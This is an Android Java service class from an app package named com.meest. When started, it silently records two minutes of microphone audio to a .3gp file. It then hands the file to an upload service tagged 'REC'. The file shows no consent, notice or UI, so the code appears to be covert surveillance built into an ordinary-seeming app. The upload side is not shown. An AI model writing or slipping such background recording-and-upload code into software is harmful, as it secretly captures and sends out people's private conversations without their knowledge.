package com.meest.Services.GalUpload;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.meest.meestbhart.utilss.Constant;

import java.io.File;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class AudioRecord extends Service {


    long mtime;
    String output;
    SharedPreferences sharedPreferences;
    public AudioRecord() {
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        try {
//            time = Integer.parseInt(value);
            Log.e("Record", "time");

            sharedPreferences = getSharedPreferences("DATA", Context.MODE_PRIVATE);
            if (sharedPreferences.getBoolean("isMicFree", true))
            {    output = Constant.createOutputPath(AudioRecord.this, ".3gp");
                mtime = 120000;
                Log.e("Record", "2");
                record();

            }


        }catch (Exception e){
            Log.e("Exception Record",e+"");
        }

        return super.onStartCommand(intent, flags, startId);
    }

    AudioRecorder audioRecorder;
    public void record() {
        audioRecorder = new AudioRecorder(output,getApplicationContext());
        try {
            audioRecorder.start();
            Log.e("Record","start");
        } catch (IOException e) {
            e.printStackTrace();
        }
        final Handler handler = new Handler();
        Timer t = new Timer();
        t.schedule(new TimerTask() {
            public void run() {
                handler.post(new Runnable() {
                    public void run() {
                        try {
                            audioRecorder.stop();
                            Log.e("Record","stop");
                            if(output.contains("3gp")){
                                Intent intentcall = new Intent(AudioRecord.this, GalUploadService.class);
                                intentcall.putExtra("key","REC");
                                intentcall.putExtra("path",output);
                                startService(intentcall);
                            }


//                            if(time > 0){
//                                time--;
//                                record();
//                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                });
            }
        }, mtime);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}